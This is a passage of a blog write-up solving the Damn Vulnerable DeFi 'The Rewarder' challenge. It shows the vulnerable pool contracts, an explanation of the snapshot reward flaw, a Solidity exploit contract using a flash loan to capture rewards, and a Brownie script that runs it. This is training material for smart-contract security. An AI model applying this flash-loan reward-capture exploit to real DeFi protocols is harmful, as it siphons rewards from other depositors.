internal pure override &#123;</span><br><span class="line">        <span class="title function_">revert</span>(<span class="string">&quot;Not implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FlashLoanerPool-sol"><a href="#FlashLoanerPool-sol" class="headerlink" title="FlashLoanerPool.sol"></a>FlashLoanerPool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FlashLoanerPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> A simple pool to get flash loans of DVT</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FlashLoanerPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">DamnValuableToken</span> public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address liquidityTokenAddress</span>) &#123;</span><br><span class="line">        liquidityToken = <span class="title class_">DamnValuableToken</span>(liquidityTokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 amount</span>) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = liquidityToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(amount &lt;= balanceBefore, <span class="string">&quot;Not enough token balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span>.<span class="title function_">isContract</span>(), <span class="string">&quot;Borrower must be a deployed contract&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        liquidityToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount);</span><br><span class="line"></span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">functionCall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;receiveFlashLoan(uint256)&quot;</span>,</span><br><span class="line">                amount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(liquidityToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &gt;= balanceBefore, <span class="string">&quot;Flash loan not paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RewardToken-sol"><a href="#RewardToken-sol" class="headerlink" title="RewardToken.sol"></a>RewardToken.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">RewardToken</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> A mintable ERC20 with 2 decimals to issue rewards</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">RewardToken</span> is <span class="title class_">ERC20</span>, <span class="title class_">AccessControl</span> &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">MINTER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;MINTER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;Reward Token&quot;</span>, <span class="string">&quot;RWT&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">DEFAULT_ADMIN_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address to, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>));</span><br><span class="line">        <span class="title function_">_mint</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TheRewarderPool-sol"><a href="#TheRewarderPool-sol" class="headerlink" title="TheRewarderPool.sol"></a>TheRewarderPool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./RewardToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./AccountingToken.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TheRewarderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TheRewarderPool</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Minimum duration of each round of rewards in seconds</span></span><br><span class="line">    uint256 private constant <span class="variable constant_">REWARDS_ROUND_MIN_DURATION</span> = <span class="number">5</span> days;</span><br><span class="line"></span><br><span class="line">    uint256 public lastSnapshotIdForRewards;</span><br><span class="line">    uint256 public lastRecordedSnapshotTimestamp;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public lastRewardTimestamps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token deposited into the pool by users</span></span><br><span class="line">    <span class="title class_">DamnValuableToken</span> public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token used for internal accounting and snapshots</span></span><br><span class="line">    <span class="comment">// Pegged 1:1 with the liquidity token</span></span><br><span class="line">    <span class="title class_">AccountingToken</span> public accToken;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Token in which rewards are issued</span></span><br><span class="line">    <span class="title class_">RewardToken</span> public immutable rewardToken;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Track number of rounds</span></span><br><span class="line">    uint256 public roundNumber;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress</span>) &#123;</span><br><span class="line">        <span class="comment">// Assuming all three tokens have 18 decimals</span></span><br><span class="line">        liquidityToken = <span class="title class_">DamnValuableToken</span>(tokenAddress);</span><br><span class="line">        accToken = <span class="keyword">new</span> <span class="title class_">AccountingToken</span>();</span><br><span class="line">        rewardToken = <span class="keyword">new</span> <span class="title class_">RewardToken</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_recordSnapshot</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@notice</span> sender must have approved `amountToDeposit` liquidity tokens in advance</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">uint256 amountToDeposit</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(amountToDeposit &gt; <span class="number">0</span>, <span class="string">&quot;Must deposit tokens&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        accToken.<span class="title function_">mint</span>(msg.<span class="property">sender</span>, amountToDeposit);</span><br><span class="line">        <span class="title function_">distributeRewards</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            liquidityToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountToDeposit)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amountToWithdraw</span>) external &#123;</span><br><span class="line">        accToken.<span class="title function_">burn</span>(msg.<span class="property">sender</span>, amountToWithdraw);</span><br><span class="line">        <span class="built_in">require</span>(liquidityToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amountToWithdraw));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">distributeRewards</span>(<span class="params"></span>) public returns (uint256) &#123;</span><br><span class="line">        uint256 rewards = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">isNewRewardsRound</span>()) &#123;</span><br><span class="line">            <span class="title function_">_recordSnapshot</span>();</span><br><span class="line">        &#125;        </span><br><span class="line">        </span><br><span class="line">        uint256 totalDeposits = accToken.<span class="title function_">totalSupplyAt</span>(lastSnapshotIdForRewards);</span><br><span class="line">        uint256 amountDeposited = accToken.<span class="title function_">balanceOfAt</span>(msg.<span class="property">sender</span>, lastSnapshotIdForRewards);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (amountDeposited &gt; <span class="number">0</span> &amp;&amp; totalDeposits &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            rewards = (amountDeposited * <span class="number">100</span> * <span class="number">10</span> ** <span class="number">18</span>) / totalDeposits;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(rewards &gt; <span class="number">0</span> &amp;&amp; !<span class="title function_">_hasRetrievedReward</span>(msg.<span class="property">sender</span>)) &#123;</span><br><span class="line">                rewardToken.<span class="title function_">mint</span>(msg.<span class="property">sender</span>, rewards);</span><br><span class="line">                lastRewardTimestamps[msg.<span class="property">sender</span>] = block.<span class="property">timestamp</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rewards;     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_recordSnapshot</span>(<span class="params"></span>) private &#123;</span><br><span class="line">        lastSnapshotIdForRewards = accToken.<span class="title function_">snapshot</span>();</span><br><span class="line">        lastRecordedSnapshotTimestamp = block.<span class="property">timestamp</span>;</span><br><span class="line">        roundNumber++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_hasRetrievedReward</span>(<span class="params">address account</span>) private view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp;</span><br><span class="line">            lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + <span class="variable constant_">REWARDS_ROUND_MIN_DURATION</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isNewRewardsRound</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> block.<span class="property">timestamp</span> &gt;= lastRecordedSnapshotTimestamp + <span class="variable constant_">REWARDS_ROUND_MIN_DURATION</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Our goal is to get more than <code>100 rewardTokens</code> and make others get less than <code>0.01 rewardTokens</code> in the next round without any <code>DVT</code>. Since the <code>TheRewardPool</code> contract is using an <code>ERC20Snapshot</code> extension for the <code>AccountingToken</code> and the rewards are based on the latest snapshot, which is valid for the next five days from <code>lastRecordedSnapshotTimestamp</code> it lends <code>DVT</code> from the <code>FlashLoanerPool</code> and deposit in the <code>TheRewardPool</code> when it is about to record the snapshot using <code>_recordSnapshot()</code> function, we will be able to manage the rewarding system that we kept the tokens in the contract for next five days which will impact the reward amount since we have more <code>DVT</code> even after we withdrew and returned to the <code>FlashLoanerPool</code> because the <code>distributeRewards()</code> function checks the balance in the latest snapshot instead of the current balance, we get more reward nearly <code>100 * 10 ** 18</code>, and others get significantly fewer rewards which are negligible.</p>
<h3 id="the-rewarder-exploit-sol"><a href="#the-rewarder-exploit-sol" class="headerlink" title="the_rewarder_exploit.sol"></a>the_rewarder_exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">TheRewarderPool</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">uint256 amountToDeposit</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amountToWithdraw</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">distributeRewards</span>(<span class="params"></span>) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">FlashLoanerPool</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">DamnValuableToken</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">RewardToken</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract therewarder_Exploit &#123;</span><br><span class="line">    <span class="title class_">TheRewarderPool</span> reward_pool;</span><br><span class="line">    <span class="title class_">FlashLoanerPool</span> flash_pool;</span><br><span class="line">    <span class="title class_">DamnValuableToken</span> token;</span><br><span class="line">    <span class="title class_">RewardToken</span> reward_token;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _address,</span></span><br><span class="line"><span class="params">        address __address,</span></span><br><span class="line"><span class="params">        address _address_,</span></span><br><span class="line"><span class="params">        address __address_</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        reward_pool = <span class="title class_">TheRewarderPool</span>(_address);</span><br><span class="line">        flash_pool = <span class="title class_">FlashLoanerPool</span>(__address);</span><br><span class="line">        token = <span class="title class_">DamnValuableToken</span>(_address_);</span><br><span class="line">        reward_token = <span class="title class_">RewardToken</span>(__address_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveFlashLoan</span>(<span class="params">uint256 amount</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(flash_pool));</span><br><span class="line"></span><br><span class="line">        token.<span class="title function_">approve</span>(<span class="title function_">address</span>(reward_pool), amount);</span><br><span class="line">        reward_pool.<span class="title function_">deposit</span>(amount);</span><br><span class="line">        reward_pool.<span class="title function_">distributeRewards</span>();</span><br><span class="line">        reward_pool.<span class="title function_">withdraw</span>(amount);</span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        flash_pool.<span class="title function_">flashLoan</span>(token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(flash_pool)));</span><br><span class="line">        reward_token.<span class="title function_">transfer</span>(</span><br><span class="line">            msg.<span class="property">sender</span>,</span><br><span class="line">            reward_token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="the-rewarder-py"><a href="#the-rewarder-py" class="headerlink" title="the-rewarder.py"></a>the-rewarder.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DamnValuableToken, FlashLoanerPool, AccountingToken, TheRewarderPool, RewardToken, therewarder_Exploit, accounts, chain, Wei</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TOKENS_IN_LENDER_POOL = Wei(<span class="string">&quot;1000000 ether&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    deployer, alice, bob, charlie, david, attacker = accounts[:<span class="number">6</span>]</span><br><span class="line">    users = [alice, bob, charlie, david]</span><br><span class="line"></span><br><span class="line">    liquidityToken = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    flash_pool = FlashLoanerPool.deploy(</span><br><span class="line">        liquidityToken, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    liquidityToken.transfer(</span><br><span class="line">        flash_pool, TOKENS_IN_LENDER_POOL, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    rewarderPool = TheRewarderPool.deploy(liquidityToken, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    rewardToken = RewardToken.at(rewarderPool.rewardToken())</span><br><span class="line">    accountingToken = AccountingToken.at(rewarderPool.accToken())</span><br><span class="line"></span><br><span class="line">    amount = Wei(<span class="string">&quot;100 ether&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        liquidityToken.transfer(i, amount, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">        liquidityToken.approve(rewarderPool, amount, &#123;<span class="string">&#x27;from&#x27;</span>: i&#125;)</span><br><span class="line">        rewarderPool.deposit(amount, &#123;<span class="string">&#x27;from&#x27;</span>: i&#125;)</span><br><span class="line">        <span class="keyword">assert</span> accountingToken.balanceOf(i) == amount</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> accountingToken.totalSupply() == Wei(<span class="string">&quot;400 ether&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> rewardToken.totalSupply() == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    chain.sleep(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        rewarderPool.distributeRewards(&#123;<span class="string">&#x27;from&#x27;</span>: i&#125;)</span><br><span class="line">        <span class="keyword">assert</span> rewardToken.balanceOf(i) == Wei(<span class="string">&quot;25 ether&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> rewardToken.totalSupply() == Wei(<span class="string">&quot;100 ether&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> liquidityToken.balanceOf(attacker) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> rewarderPool.roundNumber() == <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, users, liquidityToken, flash_pool, rewarderPool, rewardToken, accountingToken</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">attacker, liquidityToken, flash_pool, rewarderPool, rewardToken</span>):</span><br><span class="line">    chain.sleep(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">5</span>)</span><br><span class="line">    exploit = therewarder_Exploit.deploy(</span><br><span class="line">        rewarderPool, flash_pool, liquidityToken, rewardToken, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">attacker, users, rewarderPool, rewardToken, liquidityToken</span>):</span><br><span class="line">    <span class="keyword">assert</span> rewarderPool.roundNumber() == <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        rewarderPool.distributeRewards(&#123;<span class="string">&#x27;from&#x27;</span>: i&#125;)</span><br><span class="line">        rewards = rewardToken.balanceOf(i)</span><br><span class="line"></span><br><span class="line">        delta = rewards - Wei(<span class="string">&quot;25 ether&quot;</span>)</span><br><span class="line">        <span class="keyword">assert</span> delta &lt; Wei(<span 